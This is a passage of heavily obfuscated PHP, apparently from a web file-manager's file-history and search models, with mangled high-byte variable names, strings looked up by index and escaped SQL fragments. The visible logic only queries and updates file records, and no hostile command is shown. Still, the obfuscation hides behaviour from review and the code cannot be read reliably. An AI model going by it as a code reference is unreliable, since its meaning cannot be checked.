$æ¯Äìë[12]; $°õ×ğ“©[$æ¯Äìë[1719]] = 0; $°õ×ğ“©[$æ¯Äìë[776]] = $¤ÖÈà§Š[$æ¯Äìë[76]]; $this->update(); self::log($æ¯Äìë[1761] . json_encode(array($°õ×ğ“©, $¤ÖÈà§Š))); } public function nameParse($¢çÃ‘şË) { $·‡´ù„‡ =& $_SERVER[ Ö‘ñÄ”]; $Ú¸ºì¼” =& $this->task; if ($Ú¸ºì¼”[$·‡´ù„‡[1759]] == $·‡´ù„‡[1205]) { $Ú¸ºì¼”[$·‡´ù„‡[1759]] = $·‡´ù„‡[322]; $Ú¸ºì¼”[$·‡´ù„‡[1719]] = 0; $Ú¸ºì¼”[$·‡´ù„‡[776]] = 0; } $ªÊ÷õäô = get_path_this($¢çÃ‘şË); if (strstr($ªÊ÷õäô, $·‡´ù„‡[10])) { $Ú¸ºì¼”[$·‡´ù„‡[1664]] += 1; $Ú¸ºì¼”[$·‡´ù„‡[799]] += 1; } $Ú¸ºì¼”[$·‡´ù„‡[1712]] = $¢çÃ‘şË; $this->update(); } } $_file = $_SERVER[$_SERVER[ Ö‘ñÄ”][239]]; $_size = $_SERVER[ Ö‘ñÄ”][1762]; goto C¹å¶Â†ØÒ; e÷õ‰—ÌÖÂ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\x63\x65\x5f\150\x69\163\164\157\x72\x79"; public function historyCount($Â«¨«) { $ĞêİÚº° =& $_SERVER[ Ö‘ñÄ”]; if (!$Â«¨«) { return array(); } if (is_string($Â«¨«) || is_int($Â«¨«)) { $Â«¨« = array($Â«¨«); } $À‰¯ˆÄ‡ = array($ĞêİÚº°[410], $ĞêİÚº°[1869] => $ĞêİÚº°[508]); $Ø‰×µá = array($ĞêİÚº°[410] => array($ĞêİÚº°[7], $Â«¨«)); $µŞ½É­µ = $this->field($À‰¯ˆÄ‡)->where($Ø‰×µá)->group($ĞêİÚº°[410])->select(); return array_to_keyvalue($µŞ½É­µ, $ĞêİÚº°[410], $ĞêİÚº°[508]); } public function addHistory($ÖÌåˆ„è, $×¯ëË°  = '') { $¹‘İªÇÙ =& $_SERVER[ Ö‘ñÄ”]; $Š°Øãò = array($¹‘İªÇÙ[425] => $ÖÌåˆ„è[$¹‘İªÇÙ[410]], $¹‘İªÇÙ[1654] => isset($ÖÌåˆ„è[$¹‘İªÇÙ[464]]) ? $ÖÌåˆ„è[$¹‘İªÇÙ[464]] : $ÖÌåˆ„è[$¹‘İªÇÙ[462]], $¹‘İªÇÙ[477] => $ÖÌåˆ„è[$¹‘İªÇÙ[476]], $¹‘İªÇÙ[593] => $ÖÌåˆ„è[$¹‘İªÇÙ[76]], $¹‘İªÇÙ[2075] => $×¯ëË° ); if ($GLOBALS[$¹‘İªÇÙ[6]][$¹‘İªÇÙ[89]][$¹‘İªÇÙ[1215]] >= 1) { $this->historyAutoClear($Š°Øãò[$¹‘İªÇÙ[410]]); $this->add($Š°Øãò); } Hook::trigger($¹‘İªÇÙ[2076], $Š°Øãò); Model($¹‘İªÇÙ[2077])->eventFileEdit($ÖÌåˆ„è[$¹‘İªÇÙ[410]]); } private function historyAutoClear($´¢ä·ŞÈ) { $âåäÒ =& $_SERVER[ Ö‘ñÄ”]; $¹úÓ¯“ª = Model($âåäÒ[783])->get($âåäÒ[1237]); $°™ßû÷Ğ = $GLOBALS[$âåäÒ[6]][$âåäÒ[89]][$âåäÒ[1215]]; $àÜ¾Êœü = $¹úÓ¯“ª == $âåäÒ[1238] ? min(5, $°™ßû÷Ğ) : $°™ßû÷Ğ; $àÜ¾Êœü = $àÜ¾Êœü <= 0 ? 0 : $àÜ¾Êœü - 1; if ($àÜ¾Êœü >= 500) { return; } $È¹ş «Ÿ = array($âåäÒ[425] => $´¢ä·ŞÈ); $¢«ŠÈ• = $this->field($âåäÒ[2078])->where($È¹ş «Ÿ)->order($âåäÒ[2072])->select(); if (!$¢«ŠÈ• || $àÜ¾Êœü >= count($¢«ŠÈ•)) { return; } $ª‡¤‘ùÒ = array_to_keyvalue($¢«ŠÈ•, $âåäÒ[12], $âåäÒ[407]); $ª‡¤‘ùÒ = array_slice($ª‡¤‘ùÒ, $àÜ¾Êœü); $±Ç¿®ì‹ = array_to_keyvalue($¢«ŠÈ•, $âåäÒ[12], $âåäÒ[476]); $±Ç¿®ì‹ = array_slice($±Ç¿®ì‹, $àÜ¾Êœü); if (!$ª‡¤‘ùÒ || !$±Ç¿®ì‹) { return; } $È¹ş «Ÿ = array($âåäÒ[427] => array($âåäÒ[7], $ª‡¤‘ùÒ)); $this->where($È¹ş «Ÿ)->delete(); Model($âåäÒ[479])->remove($±Ç¿®ì‹); } public function listData($¿«¯ß¦…) { $Í¿½áÂğ =& $_SERVER[ Ö‘ñÄ”]; $Ÿ’¥¬ø¥ = array($Í¿½áÂğ[425] => $¿«¯ß¦…); $êµÔ˜ˆù = $Í¿½áÂğ[2079]; $–î¹á³ = $this->field($êµÔ˜ˆù)->where($Ÿ’¥¬ø¥)->order($Í¿½áÂğ[2072])->selectPage(); $this->_listAppendUser($–î¹á³[$Í¿½áÂğ[378]]); $»©Ğ†¯ = Model($Í¿½áÂğ[783])->get($Í¿½áÂğ[1237]); $ïÚõ•Œ = 5; if ($»©Ğ†¯ == $Í¿½áÂğ[1238]) { $–î¹á³[$Í¿½áÂğ[378]] = array_slice($–î¹á³[$Í¿½áÂğ[378]], 0, $ïÚõ•Œ); $–î¹á³[$Í¿½áÂğ[375]] = array($Í¿½áÂğ[2080] => 1, $Í¿½áÂğ[2081] => 20, $Í¿½áÂğ[2082] => 1, $Í¿½áÂğ[2083] => count($–î¹á³[$Í¿½áÂğ[378]])); } return $–î¹á³; } protected function _listAppendUser(&$å«ö«Ñï) { $´İ¨ÉìÇ =& $_SERVER[ Ö‘ñÄ”]; $˜¦¶Ì²è = array_to_keyvalue($å«ö«Ñï, $´İ¨ÉìÇ[12], $´İ¨ÉìÇ[1663]); $È»æú“ = Model($´İ¨ÉìÇ[543])->userListInfo($˜¦¶Ì²è); foreach ($å«ö«Ñï as &$Öø¥Ïõ) { $ İØä˜ = $Öø¥Ïõ[$´İ¨ÉìÇ[1663]]; $Öø¥Ïõ[$´İ¨ÉìÇ[462]] = $È»æú“[$ İØä˜] ? $È»æú“[$ İØä˜] : !1; } unset($Öø¥Ïõ); } public function fileInfo($…»ä‹ä) { $Ãµ—¢ïË =& $_SERVER[ Ö‘ñÄ”]; $ûşÆá›Ë = $this->tablePrefix; $Ü¸ÀŠ€Ú = "{$ûşÆá›Ë}\x69\157\x5f\x66\151\x6c\x65\40\146\151\154\145\163\40\157\x6e\40\x66\151\x6c\x65\163\56\x66\151\x6c\145\x49\x44\x20\x3d\x20\x68\151\163\x74\157\x72\171\56\146\151\154\x65\111\x44"; return $this->alias($Ãµ—¢ïË[2084])->where(array($Ãµ—¢ïË[427] => $…»ä‹ä))->join($Ü¸ÀŠ€Ú, $Ãµ—¢ïË[2085])->find(); } public function removeItem($ƒõµ­ˆ) { $İÈÉ¥“Ç =& $_SERVER[ Ö‘ñÄ”]; $×÷Ç»¬ = array($İÈÉ¥“Ç[427] => $ƒõµ­ˆ); $ÆÅğ´ˆ = $this->where($×÷Ç»¬)->find(); if ($ÆÅğ´ˆ) { $â¨ú‡Ú¬ = $this->where($×÷Ç»¬)->delete(); Model($İÈÉ¥“Ç[479])->remove($ÆÅğ´ˆ[$İÈÉ¥“Ç[476]]); return $â¨ú‡Ú¬; } return !1; } public function removeBySource($Ö±‡ÒÁï) { $†İ¥Á” =& $_SERVER[ Ö‘ñÄ”]; if (!$Ö±‡ÒÁï) { return !1; } if (!is_array($Ö±‡ÒÁï)) { $Ö±‡ÒÁï = array($Ö±‡ÒÁï); } $øæˆ¿×¡ = array($†İ¥Á”[425] => array($†İ¥Á”[7], $Ö±‡ÒÁï)); $ª«Öæ·„ = $this->field($†İ¥Á”[477])->where($øæˆ¿×¡)->select(); if ($ª«Öæ·„) { $this->where($øæˆ¿×¡)->delete(); $Ğ€Ò»Œ¿ = array_to_keyvalue($ª«Öæ·„, $†İ¥Á”[12], $†İ¥Á”[476]); Model($†İ¥Á”[479])->remove($Ğ€Ò»Œ¿); } return !0; } public function setDetail($©òØ†ƒ¤, $‚ĞÇ“ô) { $ùáüü¯§ =& $_SERVER[ Ö‘ñÄ”]; return $this->where(array($ùáüü¯§[427] => $©òØ†ƒ¤))->save(array($ùáüü¯§[2075] => $‚ĞÇ“ô)); } public function rollbackToItem($«¨‡£•ç, $´•¯šåã) { $œñè¡Ù =& $_SERVER[ Ö‘ñÄ”]; $’›†Æ‡ë = Model($œñè¡Ù[838])->sourceInfo($«¨‡£•ç); $this->addHistory($’›†Æ‡ë, LNG($œñè¡Ù[2086])); $î¤Ğ±òÌ = $this->find($´•¯šåã); $ôşÄ»Îå = array($œñè¡Ù[476] => $î¤Ğ±òÌ[$œñè¡Ù[476]], $œñè¡Ù[76] => $î¤Ğ±òÌ[$œñè¡Ù[76]], $œñè¡Ù[85] => time(), $œñè¡Ù[464] => USER_ID); Model($œñè¡Ù[838])->where(array($œñè¡Ù[410] => $«¨‡£•ç))->save($ôşÄ»Îå); return $this->where(array($œñè¡Ù[427] => $´•¯šåã))->delete(); } public function clearSame($ƒ·÷¹°) { $Üã©ôƒÕ =& $_SERVER[ Ö‘ñÄ”]; $È÷™²ş· = $this->listData($ƒ·÷¹°); $Ö–ö—İÒ = array_to_keyvalue_group($È÷™²ş·, $Üã©ôƒÕ[476]); $ŒøÙÜêŠ = array(); $š÷É¨À¤ = array(); foreach ($Ö–ö—İÒ as $œ†¶öÂù) { if (!$œ†¶öÂù || count($œ†¶öÂù) <= 1) { continue; } foreach ($œ†¶öÂù as $ô”’Â®) { $ŒøÙÜêŠ[] = $ô”’Â®[$Üã©ôƒÕ[476]]; $š÷É¨À¤[] = $ô”’Â®[$Üã©ôƒÕ[407]]; } } if (!$š÷É¨À¤) { return; } $this->where(array($Üã©ôƒÕ[407] => array($Üã©ôƒÕ[7], $š÷É¨À¤)))->delete(); Model($Üã©ôƒÕ[479])->remove($ŒøÙÜêŠ); } public function userSpace() { $õè¿°ÓŸ =& $_SERVER[ Ö‘ñÄ”]; $¾ø¦È¼ = $this->tablePrefix; $¾»ñßó‰ = array($õè¿°ÓŸ[1654] => USER_ID); $¹¨Ñ›‘‚ = "{$¾ø¦È¼}\151\x6f\x5f\x66\151\x6c\x65\40\146\x69\154\x65\163\40\157\156\x20\146\x69\154\x65\x73\56\x66\x69\x6c\145\x49\104\x20\x3d\x20\150\x69\x73\x74\157\162\171\56\x66\151\154\145\x49\x44"; return $this->alias($õè¿°ÓŸ[2084])->where($¾»ñßó‰)->join($¹¨Ñ›‘‚, $õè¿°ÓŸ[2085])->sum($õè¿°ÓŸ[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($À°ÇŠëŠ) { $œùÜ¶µß =& $_SERVER[ Ö‘ñÄ”]; $”÷†›‡› = KodIO::fileTypeList(); $©ÖÇ¥úİ = $”÷†›‡›[$À°ÇŠëŠ]; if (!$©ÖÇ¥úİ) { return array(); } $«Ú¨ò’¶ = $©ÖÇ¥úİ[$œùÜ¶µß[174]]; $Ê„÷êäë = $œùÜ¶µß[7]; if (!$©ÖÇ¥úİ[$œùÜ¶µß[174]]) { $÷œüÏÑÓ = array_to_keyvalue($”÷†›‡›, $œùÜ¶µß[12], $œùÜ¶µß[174]); $«Ú¨ò’¶ = implode($œùÜ¶µß[50], $÷œüÏÑÓ); $Ê„÷êäë = $œùÜ¶µß[2087]; } $™â‡•İ = explode($œùÜ¶µß[50], trim($«Ú¨ò’¶, $œùÜ¶µß[50])); return array($Ê„÷êäë, $™â‡•İ); } public function listPathType($›ŞÕ†¤½) { $ãÈÉ±ûŸ =& $_SERVER[ Ö‘ñÄ”]; $‰‰Ìàø = $this->fileTypeWhere($›ŞÕ†¤½); if (!$‰‰Ìàø) { return array(); } $Í÷â‚¿ö = USER_ID; $›·áÛµª = Model($ãÈÉ±ûŸ[543])->getInfo($Í÷â‚¿ö); $°“ÎùèŸ = array($ãÈÉ±ûŸ[594] => SourceModel::TYPE_USER, $ãÈÉ±ûŸ[529] => array($ãÈÉ±ûŸ[558], $ãÈÉ±ûŸ[539] . $›·áÛµª[$ãÈÉ±ûŸ[86]][$ãÈÉ±ûŸ[410]] . $ãÈÉ±ûŸ[559]), $ãÈÉ±ûŸ[595] => $Í÷â‚¿ö, $ãÈÉ±ûŸ[591] => 0, $ãÈÉ±ûŸ[592] => $‰‰Ìàø); return $this->listSource($°“ÎùèŸ); } public function listSearch($«ĞŞİ£®, $Ø½Íé—¾ = 300) { $³ÂŠ“ÑÎ =& $_SERVER[ Ö‘ñÄ”]; if (isset($«ĞŞİ£®[$³ÂŠ“ÑÎ[1930]]) && $«ĞŞİ£®[$³ÂŠ“ÑÎ[1930]]) { $«ĞŞİ£®[$³ÂŠ“ÑÎ[1930]] = str_replace($³ÂŠ“ÑÎ[392], $³ÂŠ“ÑÎ[2088], trim($«ĞŞİ£®[$³ÂŠ“ÑÎ[1930]])); } $”¡¢°©û = $this->_parseSearchWhere($«ĞŞİ£®); if (!isset($”¡¢°©û[$³ÂŠ“ÑÎ[439]])) { $”¡¢°©û[$³ÂŠ“ÑÎ[439]] = 0; } $÷©¿Ç»´ = $³ÂŠ“ÑÎ[2089]; $†ÀËˆ›ˆ = $”¡¢°©û; $Š°ÃƒŠ© = $÷©¿Ç»´; $this->_listSearchBindPinyin($«ĞŞİ£®, $”¡¢°©û, $÷©¿Ç»´); $this->alias($³ÂŠ“ÑÎ[454])->_makeOrder(); $”¡¢°©û = $this->parseWhereLike($”¡¢°©û); $œîÆûŞ— = $this->distinct(!0)->field($÷©¿Ç»´)->where($”¡¢°©û)->selectPage($Ø½Íé—¾); if ($GLOBALS[$³ÂŠ“ÑÎ[6]][$³ÂŠ“ÑÎ[389]][$³ÂŠ“ÑÎ[390]] && Input::check($«ĞŞİ£®[$³ÂŠ“ÑÎ[1930]], $³ÂŠ“ÑÎ[601]) && $œîÆûŞ—[$³ÂŠ“ÑÎ[375]][$³ÂŠ“ÑÎ[362]] == 1 && $œîÆûŞ—[$³ÂŠ“ÑÎ[375]][$³ÂŠ“ÑÎ[376]] == 0) { $œîÆûŞ— = $this->distinct(!0)->field($÷©¿Ç»´)->where($†ÀËˆ›ˆ)->limit(1000)->select(); $œîÆûŞ— = array_page_split($œîÆûŞ—, !1, $Ø½Íé—¾); } $this->_listSearchFileContent($œîÆûŞ—, $«ĞŞİ£®, $Š°ÃƒŠ©, $†ÀËˆ›ˆ); $this->_listSearchDesc($œîÆûŞ—, $«ĞŞİ£®, $Š°ÃƒŠ©); $this->_listSearchTag($œîÆûŞ—, $«ĞŞİ£®, $Š°ÃƒŠ©); $this->_listSearchGroupTag($œîÆûŞ—, $«ĞŞİ£®, $Š°ÃƒŠ©); $this->_listDataApply($œîÆûŞ—[$³ÂŠ“ÑÎ[378]]); $this->_listMake($œîÆûŞ—); return $œîÆûŞ—; } private function _listSearchFileContent(&$“…òºñ, $ˆÕáÆÒ, $æœ§ŞƒÑ, $÷åñê’½) { $”¹ùÇ‘‡ =& $_SERVER[ Ö‘ñÄ”]; if (!$ˆÕáÆÒ[$”¹ùÇ‘‡[1930]] || $“…òºñ[$”¹ùÇ‘‡[375]][$”¹ùÇ‘‡[362]] > 1) { return; } if (!isset($÷åñê’½[$”¹ùÇ‘‡[32]]) || !is_array($ˆÕáÆÒ[$”¹ùÇ‘‡[476]])) { return; } $÷åñê’½[$”¹ùÇ‘‡[476]] = array($”¹ùÇ‘‡[7], $ˆÕáÆÒ[$”¹ùÇ‘‡[476]]); unset($÷åñê’½[$”¹ùÇ‘‡[32]]); unset($ˆÕáÆÒ[$”¹ùÇ‘‡[476]]); $Ûıİ„Éò = $this->field($æœ§ŞƒÑ)->where($÷åñê’½)->limit($”¹ùÇ‘‡[2090])->select(); if (!$Ûıİ„Éò || count($Ûıİ„Éò) == 0) { return; } $“…òºñ[$”¹ùÇ‘‡[378]] = array_merge($Ûıİ„Éò, $“…òºñ[$”¹ùÇ‘‡[378]]); $“…òºñ[$”¹ùÇ‘‡[375]][$”¹ùÇ‘‡[376]] += count($Ûıİ„Éò); } private function _listSearchTag(&$¼¤ñù±µ, $ÖÈ‘ºÕ¨, $‡ÃêÑ°Á) { $­¢Ùì¯à =& $_SERVER[ Ö‘ñÄ”]; if (!$ÖÈ‘ºÕ¨[$­¢Ùì¯à[1930]] || $¼¤ñù±µ[$­¢Ùì¯à[375]][$­¢Ùì¯à[362]] > 1) { return; } $¦¾‘¾–è = Model($­¢Ùì¯à[2091])->listData(); $Ç ®ïù = array(); $¼ƒ©‹ß = $ÖÈ‘ºÕ¨[$­¢Ùì¯à[1930]]; foreach ($¦¾‘¾–è as $õêıĞûª) { $Á¿­Àñ¨ = $õêıĞûª[$­¢Ùì¯à[32]]; $¢à÷•Ø = str_replace($­¢Ùì¯à[53], $­¢Ùì¯à[12], Pinyin::get($Á¿­Àñ¨)); if (stripos($Á¿­Àñ¨, $¼ƒ©‹ß) !== !1 || stripos($¢à÷•Ø, $¼ƒ©‹ß) !== !1) { $Ç ®ïù[] = $õêıĞûª[$­¢Ùì¯à[407]]; } } if (!$Ç ®ïù) { return; } $“È›®«Ş = array($­¢Ùì¯à[434] => array($­¢Ùì¯à[7], $Ç ®ïù), $­¢Ùì¯à[1663] => USER_ID); $àÊ¿ßİ² = Model($­¢Ùì¯à[436])->field($­¢Ùì¯à[84])->where($“È›®«Ş)->select(); $àÊ¿ßİ² = array_to_keyvalue($àÊ¿ßİ², $­¢Ùì¯à[12], $­¢Ùì¯à[84]); $§ëıÕß— = array_unique($àÊ¿ßİ²); $this->_listSearchMerge($¼¤ñù±µ, $ÖÈ‘ºÕ¨, $‡ÃêÑ°Á, $§ëıÕß—); } private function _listSearchDesc(&$ØÕÔÕÓ, $¸Üâ†£ù, $ŠÉÃ€ø¦) { $¨ëÆœ¯¥ =& $_SERVER[ Ö‘ñÄ”]; if (!$¸Üâ†£ù[$¨ëÆœ¯¥[1930]] || $ØÕÔÕÓ[$¨ëÆœ¯¥[375]][$¨ëÆœ¯¥[362]] > 1) { return; } $„Ôñ‘ãÃ = array($¨ëÆœ¯¥[94] => $¨ëÆœ¯¥[461], $¨ëÆœ¯¥[383] => array($¨ëÆœ¯¥[391], $¨ëÆœ¯¥[1932] . $¸Üâ†£ù[$¨ëÆœ¯¥[1930]] . $¨ëÆœ¯¥[1932])); $Ë—ë›‡Ö = !1; if ($Ë—ë›‡Ö) { $óÆîœÍƒ = $this->listSearchChildren($¸Üâ†£ù[$¨ëÆœ¯¥[440]]); $óÆîœÍƒ = array_unique($óÆîœÍƒ); if (!$óÆîœÍƒ) { return; } $„Ôñ‘ãÃ[$¨ëÆœ¯¥[410]] = array($¨ëÆœ¯¥[7], $óÆîœÍƒ); } $ßü˜ĞŒ÷ = Model($¨ëÆœ¯¥[577])->field($¨ëÆœ¯¥[410])->where($„Ôñ‘ãÃ)->limit(5000)->select(); $£Æ†Ø€ = array_to_keyvalue($ßü˜ĞŒ÷, $¨ëÆœ¯¥[12], $¨ëÆœ¯¥[410]); $this->_listSearchMerge($ØÕÔÕÓ, $¸Üâ†£ù, $ŠÉÃ€ø¦, $£Æ†Ø€); } private function _listSearchGroupTag(&$œƒîÀƒù, $¶Ö»³Â´, $…–ÆõâÚ) { $¨íâêº =& $_SERVER[ Ö‘ñÄ”]; if (!$¶Ö»³Â´[$¨íâêº[1930]] || $œƒîÀƒù[$¨íâêº[375]][$¨íâêº[362]] > 1 || !$¶Ö»³Â´[$¨íâêº[440]]) { return; } $û„òúªŒ = $this->sourceInfo($¶Ö»³Â´[$¨íâêº[440]]); if (!$û„òúªŒ || $û„òúªŒ[$¨íâêº[419]] != SourceModel::TYPE_GROUP) { return; } $ÎˆÙ°äÅ = $û„òúªŒ[$¨íâêº[513]]; $†‚´È½ = Model($¨íâêº[2092])->get($ÎˆÙ°äÅ); $®­‘ğŞ˜ = array(); $ˆç²ôŞ = $¶Ö»³Â´[$¨íâêº[1930]]; foreach ($†‚´È½[$¨íâêº[378]] as $Äïâ­ŒÁ) { $Óè„Şİá = $Äïâ­ŒÁ[$¨íâêº[32]]; $å•ìØ¨» = str_replace($¨íâêº[53], $¨íâêº[12], Pinyin::get($Óè„Şİá)); if (stripos($Óè„Şİá, $ˆç²ôŞ) !== !1 || stripos($å•ìØ¨», $ˆç²ôŞ) !== !1) { $®­‘ğŞ˜[] = $Äïâ­ŒÁ[$¨íâêº[407]]; } } if (!$®­‘ğŞ˜) { return; } $ì«êŸúŸ = array($¨íâêº[434] => array($¨íâêº[7], $®­‘ğŞ˜), $¨íâêº[1663] => 0, $¨íâêº[33] => $¨íâêº[1952] . $ÎˆÙ°äÅ); $Ë»ÌØè = Model($¨íâêº[436])->field($¨íâêº[84])->where($ì«êŸúŸ)->select(); $Ë»ÌØè = array_to_keyvalue($Ë»ÌØè, $¨íâêº[12], $¨íâêº[84]); $¶ıš·²î = array_unique($Ë»ÌØè); $this->_listSearchMerge($œƒîÀƒù, $¶Ö»³Â´, $…–ÆõâÚ, $¶ıš·²î); } private function _listSearchMerge(&$ØÜ¯°ˆ‘, $°ôçş·¾, $¬€à¾¤œ, $¬‰·İÈâ) { $å¹Ùáœ =& $_SERVER[ Ö‘ñÄ”]; if (!$¬‰·İÈâ) { return; } $¤§—İó“ = array_to_keyvalue($ØÜ¯°ˆ‘[$å¹Ùáœ[378]], $å¹Ùáœ[12], $å¹Ùáœ[410]); $ç¥ğñ÷Š = array_diff($¬‰·İÈâ, $¤§—İó“); if (!$ç¥ğñ÷Š) { return; } $Æ“Èó¼ß = array($å¹Ùáœ[410] => array($å¹Ùáœ[7], $ç¥ğñ÷Š)); $Óàµñˆû = $this->field($¬€à¾¤œ)->where($Æ“Èó¼ß)->select(); if (!$Óàµñˆû) { return; } $ÇãŒ°—Š = array(); foreach ($Óàµñˆû as $†¹×·) { if ($this->_listSearchFilter($†¹×·, $°ôçş·¾)) { $ÇãŒ°—Š[] = $†¹×·; } } $ØÜ¯°ˆ‘[$å¹Ùáœ[378]] = array_merge($ÇãŒ°—Š, $ØÜ¯°ˆ‘[$å¹Ùáœ[378]]); $ØÜ¯°ˆ‘[$å¹Ùáœ[375]][$å¹Ùáœ[376]] += count($ÇãŒ°—Š); } private function _listSearchFilter($®ÏÇÉÄò, $ÈÎÜÄ¢) { $ÈÁƒì†ö =& $_SERVER[ Ö‘ñÄ”]; $—´‚åÎ = $®ÏÇÉÄò[$ÈÁƒì†ö[418]] == $ÈÁƒì†ö[88]; if (!strstr($®ÏÇÉÄò[$ÈÁƒì†ö[529]], $ÈÁƒì†ö[50] . $ÈÎÜÄ¢[$ÈÁƒì†ö[440]] . $ÈÁƒì†ö[50])) { return !1; } if (isset($ÈÎÜÄ¢[$ÈÁƒì†ö[420]]) && $ÈÎÜÄ¢[$ÈÁƒì†ö[420]] != $ÈÁƒì†ö[1891]) { if ($ÈÎÜÄ¢[$ÈÁƒì†ö[420]] == $ÈÁƒì†ö[75] && !$—´‚åÎ) { return !1; } if ($ÈÎÜÄ¢[$ÈÁƒì†ö[420]] != $ÈÁƒì†ö[75] && $—´‚åÎ) { return !1; } if (!strstr($®ÏÇÉÄò[$ÈÁƒì†ö[174]], $ÈÁƒì†ö[50] . $ÈÎÜÄ¢[$ÈÁƒì†ö[420]] . $ÈÁƒì†ö[50])) { return !1; } } if (isset($ÈÎÜÄ¢[$ÈÁƒì†ö[2093]]) && $ÈÎÜÄ¢[$ÈÁƒì†ö[2093]] < $®ÏÇÉÄò[$ÈÁƒì†ö[76]]) { return !1; } if (isset($ÈÎÜÄ¢[$ÈÁƒì†ö[2094]]) && $ÈÎÜÄ¢[$ÈÁƒì†ö[2094]] > $®ÏÇÉÄò[$ÈÁƒì†ö[76]]) { return !1; } if (isset($ÈÎÜÄ¢[$ÈÁƒì†ö[608]]) && $ÈÎÜÄ¢[$ÈÁƒì†ö[608]] != $®ÏÇÉÄò[$ÈÁƒì†ö[464]]) { return !1; } return !0; } public function listSearchChildren($™¨ìâÅ, $êºˆœˆ¡ = 5000) { $ï¹ä“ış =& $_SERVER[ Ö‘ñÄ”]; $«ßŸ­õ = array(); $İƒÕ‹Éâ = $this->sourceInfo($™¨ìâÅ); $°…éğªç = array($ï¹ä“ış[529] => array($ï¹ä“ış[391], $İƒÕ‹Éâ[$ï¹ä“ış[529]] . $İƒÕ‹Éâ[$ï¹ä“ış[410]] . $ï¹ä“ış[559])); $ëş¾üÙÊ = $this->field($ï¹ä“ış[76])->where($°…éğªç)->limit($êºˆœˆ¡ + 1)->select(); $òÚõ¨Öı = is_array($ëş¾üÙÊ) ? count($ëş¾üÙÊ) : 0; if ($òÚõ¨Öı > $êºˆœˆ¡) { return $this->_listSearchChildrenNear($™¨ìâÅ, $êºˆœˆ¡); } $æŠ´Ä¢° = $this->field($ï¹ä“ış[410])->where($°…éğªç)->select(); $«ßŸ­õ = array_to_keyvalue($æŠ´Ä¢°, $ï¹ä“ış[12], $ï¹ä“ış[410]); return $«ßŸ­õ; } private function _listSearchChildrenNear($û‰™Àæœ, $’ÀáËÚ) { $ÕãáÅ¹ó =& $_SERVER[ Ö‘ñÄ”]; $‹§‘Ú´Ò = array(); $ìğƒ–³Ş = array($ÕãáÅ¹ó[440] => $û‰™Àæœ); $Òôìî”½ = $this->field($ÕãáÅ¹ó[2095])->where($ìğƒ–³Ş)->select(); $Ÿé¯‡ = array_to_keyvalue(array_filter_by_field($Òôìî”½, $ÕãáÅ¹ó[418], $ÕãáÅ¹ó[88]), $ÕãáÅ¹ó[12], $ÕãáÅ¹ó[410]); $‹§‘Ú´Ò = array_merge($‹§‘Ú´Ò, array_to_keyvalue($Òôìî”½, $ÕãáÅ¹ó[12], $ÕãáÅ¹ó[410])); if (!$Ÿé¯‡) { return $‹§‘Ú´Ò; } $ìğƒ–³Ş = array($ÕãáÅ¹ó[440] => array($ÕãáÅ¹ó[7], $Ÿé¯‡)); $Òôìî”½ = $this->field($ÕãáÅ¹ó[2095])->where($ìğƒ–³Ş)->limit($’ÀáËÚ)->select(); $‹§‘Ú´Ò = array_merge($‹§‘Ú´Ò, array_to_keyvalue($Òôìî”½, $ÕãáÅ¹ó[12], $ÕãáÅ¹ó[410])); $‹§‘Ú´Ò = array_slice($‹§‘Ú´Ò, 0, $’ÀáËÚ); return $‹§‘Ú´Ò; } private function _listSearchBindPinyin($À¾¡û¬æ, &$åè©óåô, &$Èì³ÈÒæ) { $¬Ì¶æ‘ =& $_SERVER[ Ö‘ñÄ”]; if (!isset($À¾¡û¬æ[$¬Ì¶æ‘[1930]]) || !$À¾¡û¬æ[$¬Ì¶æ‘[1930]]) { return; } if (!Input::check($À¾¡û¬æ[$¬Ì¶æ‘[1930]], $¬Ì¶æ‘[327]) || strlen($À¾¡û¬æ[$¬Ì¶æ‘[1930]]) < 2) { return; } $¾‰”²öó = "\x4c\x45\x46\124\x20\112\117\111\116\40{$this->tablePrefix}\x69\157\x5f\163\x6f\x75\162\x63\145\x5f\x6d\145\x74\x61\x20\x6d\x65\164\x61\x20\x6f\156\40\163\x6f\165\x72\143\x65\56\x73\157\x75\162\x63\x65\x49\104\40\75\x20\155\145\x74\141\x2e\163\157\165\162\x63\145\111\104"; $ğ¼ñ¹óÚ = array(); $Èì³ÈÒæ = str_replace(array($¬Ì¶æ‘[231], $¬Ì¶æ‘[53], $¬Ì¶æ‘[2096]), $¬Ì¶æ‘[12], $Èì³ÈÒæ); $Èì³ÈÒæ = $¬Ì¶æ‘[446] . str_replace($¬Ì¶æ‘[50], $¬Ì¶æ‘[447], $Èì³ÈÒæ); $Ø¥‰çå = $åè©óåô[$¬Ì¶æ‘[32]]; unset($åè©óåô[$¬Ì¶æ‘[32]]); foreach ($åè©óåô as $âøÁòŸ => $€Ğªî×¸) { $ğ¼ñ¹óÚ[$¬Ì¶æ‘[446] . $âøÁòŸ] = $€Ğªî×¸; } foreach ($Ø¥‰çå as $—ŸÜÉñ¬) { $ğ¼ñ¹óÚ[] = array($¬Ì¶æ‘[451] => $—ŸÜÉñ¬, $¬Ì¶æ‘[1006] => $¬Ì¶æ‘[1934], array($¬Ì¶æ‘[2097] => $—ŸÜÉñ¬, $¬Ì¶æ‘[2098] => array($¬Ì¶æ‘[7], array($¬Ì¶æ‘[473], $¬Ì¶æ‘[472])))); } $this->join($¾‰”²öó); $åè©óåô = $ğ¼ñ¹óÚ; } private function _parseSearchWhere($‡†ç˜ã—) { $ÁÂ… =& $_SERVER[ Ö‘ñÄ”]; $Ü•Ä‰í™ = array(); if (isset($‡†ç˜ã—[$ÁÂ…[774]]) && $‡†ç˜ã—[$ÁÂ…[774]]) { $Ü•Ä‰í™[$ÁÂ…[85]] = array($ÁÂ…[2099], $‡†ç˜ã—[$ÁÂ…[774]]); } if (isset($‡†ç˜ã—[$ÁÂ…[505]]) && $‡†ç˜ã—[$ÁÂ…[505]]) { $“ÍÄöçå = array($ÁÂ…[2100], $‡†ç˜ã—[$ÁÂ…[505]]); if ($Ü•Ä‰í™[$ÁÂ…[85]]) { $Ü•Ä‰í™[$ÁÂ…[85]] = array($Ü•Ä‰í™[$ÁÂ…[85]], $“ÍÄöçå, $ÁÂ…[2101]); } else { $Ü•Ä‰í™[$ÁÂ…[85]] = $“ÍÄöçå; } } if (isset($‡†ç˜ã—[$ÁÂ…[2093]]) && $‡†ç˜ã—[$ÁÂ…[2093]] > 0) { $Ü•Ä‰í™[$ÁÂ…[76]] = array($ÁÂ…[2099], $‡†ç˜ã—[$ÁÂ…[2093]]); } if 